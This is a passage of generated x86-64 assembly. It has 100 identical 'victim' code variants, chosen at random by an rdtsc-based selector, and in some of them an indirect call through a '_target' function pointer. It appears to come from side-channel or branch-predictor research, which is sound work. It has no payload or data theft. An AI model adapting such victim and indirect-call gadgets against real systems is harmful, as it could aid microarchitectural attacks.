	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 80
.Lvictim_win1_var80:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 81
.Lvictim_win1_var81:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 82
.Lvictim_win1_var82:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 83
.Lvictim_win1_var83:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 84
.Lvictim_win1_var84:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 85
.Lvictim_win1_var85:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 86
.Lvictim_win1_var86:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 87
.Lvictim_win1_var87:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 88
.Lvictim_win1_var88:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 89
.Lvictim_win1_var89:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 90
.Lvictim_win1_var90:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 91
.Lvictim_win1_var91:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 92
.Lvictim_win1_var92:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 93
.Lvictim_win1_var93:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 94
.Lvictim_win1_var94:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 95
.Lvictim_win1_var95:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 96
.Lvictim_win1_var96:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 97
.Lvictim_win1_var97:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 98
.Lvictim_win1_var98:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 99
.Lvictim_win1_var99:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
.Lvictim_win1_continue:
	movl	%eax, -20(%rbp)
	movl	-20(%rbp), %eax
	andl	-28(%rbp), %eax
	addl	-24(%rbp), %eax
	movl	%eax, -24(%rbp)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -28(%rbp)
	jmp	LBB2_1
LBB2_4:
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_win0_var2
	cmpl	$3, %eax
	je	.Lvictim_win0_var3
	cmpl	$4, %eax
	je	.Lvictim_win0_var4
	cmpl	$5, %eax
	je	.Lvictim_win0_var5
	cmpl	$6, %eax
	je	.Lvictim_win0_var6
	cmpl	$7, %eax
	je	.Lvictim_win0_var7
	cmpl	$8, %eax
	je	.Lvictim_win0_var8
	cmpl	$9, %eax
	je	.Lvictim_win0_var9
	cmpl	$10, %eax
	je	.Lvictim_win0_var10
	cmpl	$11, %eax
	je	.Lvictim_win0_var11
	cmpl	$12, %eax
	je	.Lvictim_win0_var12
	cmpl	$13, %eax
	je	.Lvictim_win0_var13
	cmpl	$14, %eax
	je	.Lvictim_win0_var14
	cmpl	$15, %eax
	je	.Lvictim_win0_var15
	cmpl	$16, %eax
	je	.Lvictim_win0_var16
	cmpl	$17, %eax
	je	.Lvictim_win0_var17
	cmpl	$18, %eax
	je	.Lvictim_win0_var18
	cmpl	$19, %eax
	je	.Lvictim_win0_var19
	cmpl	$20, %eax
	je	.Lvictim_win0_var20
	cmpl	$21, %eax
	je	.Lvictim_win0_var21
	cmpl	$22, %eax
	je	.Lvictim_win0_var22
	cmpl	$23, %eax
	je	.Lvictim_win0_var23
	cmpl	$24, %eax
	je	.Lvictim_win0_var24
	cmpl	$25, %eax
	je	.Lvictim_win0_var25
	cmpl	$26, %eax
	je	.Lvictim_win0_var26
	cmpl	$27, %eax
	je	.Lvictim_win0_var27
	cmpl	$28, %eax
	je	.Lvictim_win0_var28
	cmpl	$29, %eax
	je	.Lvictim_win0_var29
	cmpl	$30, %eax
	je	.Lvictim_win0_var30
	cmpl	$31, %eax
	je	.Lvictim_win0_var31
	cmpl	$32, %eax
	je	.Lvictim_win0_var32
	cmpl	$33, %eax
	je	.Lvictim_win0_var33
	cmpl	$34, %eax
	je	.Lvictim_win0_var34
	cmpl	$35, %eax
	je	.Lvictim_win0_var35
	cmpl	$36, %eax
	je	.Lvictim_win0_var36
	cmpl	$37, %eax
	je	.Lvictim_win0_var37
	cmpl	$38, %eax
	je	.Lvictim_win0_var38
	cmpl	$39, %eax
	je	.Lvictim_win0_var39
	cmpl	$40, %eax
	je	.Lvictim_win0_var40
	cmpl	$41, %eax
	je	.Lvictim_win0_var41
	cmpl	$42, %eax
	je	.Lvictim_win0_var42
	cmpl	$43, %eax
	je	.Lvictim_win0_var43
	cmpl	$44, %eax
	je	.Lvictim_win0_var44
	cmpl	$45, %eax
	je	.Lvictim_win0_var45
	cmpl	$46, %eax
	je	.Lvictim_win0_var46
	cmpl	$47, %eax
	je	.Lvictim_win0_var47
	cmpl	$48, %eax
	je	.Lvictim_win0_var48
	cmpl	$49, %eax
	je	.Lvictim_win0_var49
	cmpl	$50, %eax
	je	.Lvictim_win0_var50
	cmpl	$51, %eax
	je	.Lvictim_win0_var51
	cmpl	$52, %eax
	je	.Lvictim_win0_var52
	cmpl	$53, %eax
	je	.Lvictim_win0_var53
	cmpl	$54, %eax
	je	.Lvictim_win0_var54
	cmpl	$55, %eax
	je	.Lvictim_win0_var55
	cmpl	$56, %eax
	je	.Lvictim_win0_var56
	cmpl	$57, %eax
	je	.Lvictim_win0_var57
	cmpl	$58, %eax
	je	.Lvictim_win0_var58
	cmpl	$59, %eax
	je	.Lvictim_win0_var59
	cmpl	$60, %eax
	je	.Lvictim_win0_var60
	cmpl	$61, %eax
	je	.Lvictim_win0_var61
	cmpl	$62, %eax
	je	.Lvictim_win0_var62
	cmpl	$63, %eax
	je	.Lvictim_win0_var63
	cmpl	$64, %eax
	je	.Lvictim_win0_var64
	cmpl	$65, %eax
	je	.Lvictim_win0_var65
	cmpl	$66, %eax
	je	.Lvictim_win0_var66
	cmpl	$67, %eax
	je	.Lvictim_win0_var67
	cmpl	$68, %eax
	je	.Lvictim_win0_var68
	cmpl	$69, %eax
	je	.Lvictim_win0_var69
	cmpl	$70, %eax
	je	.Lvictim_win0_var70
	cmpl	$71, %eax
	je	.Lvictim_win0_var71
	cmpl	$72, %eax
	je	.Lvictim_win0_var72
	cmpl	$73, %eax
	je	.Lvictim_win0_var73
	cmpl	$74, %eax
	je	.Lvictim_win0_var74
	cmpl	$75, %eax
	je	.Lvictim_win0_var75
	cmpl	$76, %eax
	je	.Lvictim_win0_var76
	cmpl	$77, %eax
	je	.Lvictim_win0_var77
	cmpl	$78, %eax
	je	.Lvictim_win0_var78
	cmpl	$79, %eax
	je	.Lvictim_win0_var79
	cmpl	$80, %eax
	je	.Lvictim_win0_var80
	cmpl	$81, %eax
	je	.Lvictim_win0_var81
	cmpl	$82, %eax
	je	.Lvictim_win0_var82
	cmpl	$83, %eax
	je	.Lvictim_win0_var83
	cmpl	$84, %eax
	je	.Lvictim_win0_var84
	cmpl	$85, %eax
	je	.Lvictim_win0_var85
	cmpl	$86, %eax
	je	.Lvictim_win0_var86
	cmpl	$87, %eax
	je	.Lvictim_win0_var87
	cmpl	$88, %eax
	je	.Lvictim_win0_var88
	cmpl	$89, %eax
	je	.Lvictim_win0_var89
	cmpl	$90, %eax
	je	.Lvictim_win0_var90
	cmpl	$91, %eax
	je	.Lvictim_win0_var91
	cmpl	$92, %eax
	je	.Lvictim_win0_var92
	cmpl	$93, %eax
	je	.Lvictim_win0_var93
	cmpl	$94, %eax
	je	.Lvictim_win0_var94
	cmpl	$95, %eax
	je	.Lvictim_win0_var95
	cmpl	$96, %eax
	je	.Lvictim_win0_var96
	cmpl	$97, %eax
	je	.Lvictim_win0_var97
	cmpl	$98, %eax
	je	.Lvictim_win0_var98
	cmpl	$99, %eax
	je	.Lvictim_win0_var99
	jmp	.Lvictim_win0_var0
## Variant 0
.Lvictim_win0_var0:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 1
.Lvictim_win0_var1:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 2
.Lvictim_win0_var2:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 3
.Lvictim_win0_var3:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 4
.Lvictim_win0_var4:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 5
.Lvictim_win0_var5:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 6
.Lvictim_win0_var6:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 7
.Lvictim_win0_var7:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 8
.Lvictim_win0_var8:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 9
.Lvictim_win0_var9:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 10
.Lvictim_win0_var10:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 11
.Lvictim_win0_var11:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 12
.Lvictim_win0_var12:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 13
.Lvictim_win0_var13:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 14
.Lvictim_win0_var14:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 15
.Lvictim_win0_var15:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 16
.Lvictim_win0_var16:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 17
.Lvictim_win0_var17:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 18
.Lvictim_win0_var18:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 19
.Lvictim_win0_var19:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 20
.Lvictim_win0_var20:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 21
.Lvictim_win0_var21:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 22
.Lvictim_win0_var22:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 23
.Lvictim_win0_var23:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 24
.Lvictim_win0_var24:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 25
.Lvictim_win0_var25:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 26
.Lvictim_win0_var26:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 27
.Lvictim_win0_var27:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 28
.Lvictim_win0_var28:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 29
.Lvictim_win0_var29:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 30
.Lvictim_win0_var30:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 31
.Lvictim_win0_var31:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 32
.Lvictim_win0_var32:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 33
.Lvictim_win0_var33:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 34
.Lvictim_win0_var34:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 35
.Lvictim_win0_var35:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 36
.Lvictim_win0_var36:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 37
.Lvictim_win0_var37:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 38
.Lvictim_win0_var38:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 39
.Lvictim_win0_var39:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 40
.Lvictim_win0_var40:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 41
.Lvictim_win0_var41:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 42
.Lvictim_win0_var42:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 43
.Lvictim_win0_var43:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 44
.Lvictim_win0_var44:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 45
.Lvictim_win0_var45:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 46
.Lvictim_win0_var46:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 47
.Lvictim_win0_var47:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 48
.Lvictim_win0_var48:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 49
.Lvictim_win0_var49:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 50
.Lvictim_win0_var50:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 51
.Lvictim_win0_var51:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 52
.Lvictim_win0_var52:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 53
.Lvictim_win0_var53:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 54
.Lvictim_win0_var54:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 55
.Lvictim_win0_var55:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 56
.Lvictim_win0_var56:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 57
.Lvictim_win0_var57:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 58
.Lvictim_win0_var58:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 59
.Lvictim_win0_var59:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 60
.Lvictim_win0_var60:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 61
.Lvictim_win0_var61:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 62
.Lvictim_win0_var62:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 63
.Lvictim_win0_var63:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 64
.Lvictim_win0_var64:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 65
.Lvictim_win0_var65:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 66
.Lvictim_win0_var66:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 67
.Lvictim_win0_var67:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 68
.Lvictim_win0_var68:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 69
.Lvictim_win0_var69:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 70
.Lvictim_win0_var70:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 71
.Lvictim_win0_var71:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 72
.Lvictim_win0_var72:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 73
.Lvictim_win0_var73:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 74
.Lvictim_win0_var74:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 75
.Lvictim_win0_var75:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
